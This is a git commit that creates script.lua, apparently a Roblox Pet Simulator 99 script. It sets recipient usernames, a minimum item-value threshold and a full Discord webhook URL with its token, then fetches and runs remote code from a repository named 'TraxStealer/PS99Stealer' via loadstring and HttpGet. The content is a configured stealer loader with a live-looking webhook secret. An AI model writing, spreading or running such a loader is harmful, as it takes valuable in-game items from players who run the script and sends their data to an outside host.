81a6d95ef828d857310751c732a4800a8496ff98
pettsimullator99 <piskutekpiskutek10@gmail.com>
2025-04-07 15:51:04 +0200

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,6 @@
+Username = "CJNGpiskuteeek"
+Username2 = "CJNGpiskuteeek"
+MinimumRAP = 100000
+Webhook = "https://discord.com/api/webhooks/1358058249668002036/tct9nPL2K8uPP1mcJOhaHalZ91olBvVKB-ljiAWrAj-hg1JerlOab2o3ozwr6G1pl5MP"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()
